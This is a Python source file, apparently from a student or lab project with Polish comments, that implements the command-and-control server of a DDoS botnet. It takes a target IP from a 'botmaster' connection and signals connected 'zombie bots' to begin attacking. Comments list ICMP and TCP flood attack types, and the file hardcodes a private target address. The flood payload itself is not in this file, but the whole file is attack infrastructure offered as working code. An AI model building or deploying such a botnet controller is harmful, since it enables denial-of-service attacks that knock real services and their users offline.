import socket
import time
from _thread import start_new_thread

startAttack: bool = False


# def broadcast_to_clients(clients):  # Function to manage clients
#     for client in clients:
#         try:
#             client.send('Message to pass')
#         except:
#             continue


def thread_for_botmaster(c, st):
    global startAttack
    print('Botmaster Connected')
    #todo:odebrac rodzaj ataku od botmastera
    # 1-icmp flood
    # 2-Tcp Flood
    # if rec == 1:
    #   attack_type = 'icmp_flood'
    # if rec == 2:
    #   attack_type = 'tcp_flood'
    ip = str(c.recv(16).decode())
    print('received target ip=' + ip)
    startAttack = True
    info = str(c.recv(3).decode())
    print("info:" + info)


def thread_for_zombieBot(c, addr):
    global startAttack
    while True:
        # data received from client
        if not startAttack:
            time.sleep(1)
            continue

        try:
            #todo:w zaleznosci od ataku wyslij odpowiedni identyfikator tj. 1,2,3 itd
            c.send('1'.encode())
            time.sleep(0.5)
            c.send('192.168.100.8'.encode())
        except:
            print("Bot is disconnected")
            c.close()

        while startAttack:
            time.sleep(1)

    c.close()


if __name__ == '__main__':

    host = '127.0.0.1'
    port = 65432
    max_connections = 5
    startAttack = False

    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.bind((host, port))
    socket.listen(max_connections)
    # clients = []
    try:
        while True:
            client_socket, addr = socket.accept()
            # clients.append(client_socket)

            data = client_socket.recv(1).decode()
            #print('otrzymano:' + data)
            if int(data) == 1:
                print('normal bot connected')
                start_new_thread(thread_for_zombieBot, (client_socket, addr))
            if int(data) == 2:
                #
                #można zrobić jakiś proces logowania i walidacje
                #
                print('botmaster connected')
                start_new_thread(thread_for_botmaster, (client_socket, addr))

    except KeyboardInterrupt:
        socket.close()
